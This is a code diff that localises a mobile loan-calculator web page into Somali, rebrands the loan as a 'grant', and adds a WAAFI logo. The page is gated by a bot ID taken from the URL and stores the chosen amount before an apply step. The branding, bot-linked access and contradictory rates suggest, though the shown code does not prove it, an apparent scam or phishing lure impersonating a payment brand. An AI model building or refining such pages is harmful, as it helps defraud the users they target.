@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="so">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loan Calculator</title>
+  <title>Xisaabiyaha Deeqda</title>
   <style>
     * {
       margin: 0;
@@ -28,14 +28,14 @@
       flex: 1;
     }
 
-    /* Back arrow */
+    /* Back arrow – now with reduced bottom margin */
     .back-arrow {
       font-size: 28px;
       font-weight: 300;
       color: #007AFF;
       text-decoration: none;
       display: inline-block;
-      margin-bottom: 12px;
+      margin-bottom: 4px;
       line-height: 1;
       cursor: pointer;
       width: fit-content;
@@ -45,6 +45,20 @@
     }
     .back-arrow:hover {
       opacity: 0.7;
+    }
+
+    /* WAAFI Logo */
+    .logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 16px;
+      padding: 0 2px;
+    }
+    .logo img {
+      max-width: 160px;
+      height: auto;
+      display: block;
     }
 
     /* Title & subtitle */
@@ -309,6 +323,14 @@
         font-size: 16px;
         padding: 14px;
       }
+      .logo img {
+        max-width: 130px;
+      }
+    }
+    @media (max-width: 360px) {
+      .logo img {
+        max-width: 110px;
+      }
     }
   </style>
 </head>
@@ -318,15 +340,20 @@
   <!-- Back arrow -->
   <button class="back-arrow" onclick="window.history.back()">&#8592;</button>
 
+  <!-- WAAFI Logo -->
+  <div class="logo">
+    <img src="waafi-logo.jpeg" alt="WAAFI" />
+  </div>
+
   <!-- Title & subtitle -->
-  <div class="title">Get your loan quickly</div>
-  <div class="subtitle">Fast approval • Competitive rates • Flexible terms</div>
+  <div class="title">Hesho deeq degdeg ah</div>
+  <div class="subtitle">Ansixin degdeg ah • Qiimo tartan leh • Shuruudo dabacsan</div>
 
   <!-- Calculator card -->
   <div class="card">
-    <h2>Loan Simulator</h2>
+    <h2>Tijaabiyaha Deeqda</h2>
 
-    <div class="label">LOAN AMOUNT (USD)</div>
+    <div class="label">QADARKA DEEQDA (USD)</div>
     <div class="amount" id="loanAmount">$100</div>
 
     <input type="range" min="100" max="100000" value="100" step="100" class="slider" id="loanSlider">
@@ -336,43 +363,43 @@
       <span>$100,000</span>
     </div>
 
-    <div class="min-notice">💰 Minimum amount: $100 USD</div>
+    <div class="min-notice">💰 Qadarka ugu yar: $100 USD</div>
 
     <div class="term-section">
-      <div class="term-label">LOAN TERM</div>
-      <div class="months-display" id="months">12 months</div>
+      <div class="term-label">MUDDADA DEEQDA</div>
+      <div class="months-display" id="months">12 bilood</div>
 
       <div class="term-buttons">
-        <button class="term" data-month="6">6 months</button>
-        <button class="term active" data-month="12">12 months</button>
-        <button class="term" data-month="24">24 months</button>
-        <button class="term" data-month="36">36 months</button>
-        <button class="term" data-month="48">48 months</button>
-        <button class="term" data-month="60">60 months</button>
+        <button class="term" data-month="6">6 bilood</button>
+        <button class="term active" data-month="12">12 bilood</button>
+        <button class="term" data-month="24">24 bilood</button>
+        <button class="term" data-month="36">36 bilood</button>
+        <button class="term" data-month="48">48 bilood</button>
+        <button class="term" data-month="60">60 bilood</button>
       </div>
     </div>
 
     <div class="result">
-      <div class="result-label">MONTHLY PAYMENT</div>
+      <div class="result-label">BIXINTA BISHII</div>
       <div class="payment" id="payment">$0</div>
-      <div class="rate-info">Interest rate: 4.5% APR</div>
+      <div class="rate-info">Dulsaarka: 4.5% APR</div>
     </div>
 
-    <button class="apply-btn" onclick="applyLoan()">APPLY NOW</button>
+    <button class="apply-btn" onclick="applyLoan()">CODSO HADA</button>
 
     <div class="info-grid">
       <div class="info">
         <div class="icon">⚡</div>
         <div class="info-text">
-          <b>Quick approval</b>
-          <small>Within 24 hours</small>
+          <b>Ansixin degdeg ah</b>
+          <small>24 saac gudahood</small>
         </div>
       </div>
       <div class="info">
         <div class="icon">💰</div>
         <div class="info-text">
-          <b>Low rates</b>
-          <small>Starting at 8%</small>
+          <b>Qiimo hoose</b>
+          <small>Laga bilaabo 8%</small>
         </div>
       </div>
     </div>
@@ -387,7 +414,7 @@ const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
 
 if (!botId) {
-    alert("Invalid access link");
+    alert("Link gelitaan aan sax ahayn");
     throw new Error();
 }
 
@@ -426,7 +453,7 @@ document.querySelectorAll(".term").forEach(btn => {
         document.querySelectorAll(".term").forEach(b => b.classList.remove("active"));
         this.classList.add("active");
         months = parseInt(this.dataset.month);
-        monthsDisplay.innerText = months + " months";
+        monthsDisplay.innerText = months + " bilood";
         calculate();
     };
 });
@@ -435,7 +462,7 @@ document.querySelectorAll(".term").forEach(btn => {
 function applyLoan() {
     const amount = parseFloat(slider.value);
     if (amount < 100) {
-        alert('⚠️ The minimum amount is $100 USD');
+        alert('⚠️ Qadarka ugu yar waa $100 USD');
         return;
     }
     localStorage.setItem("loanAmount", slider.value);
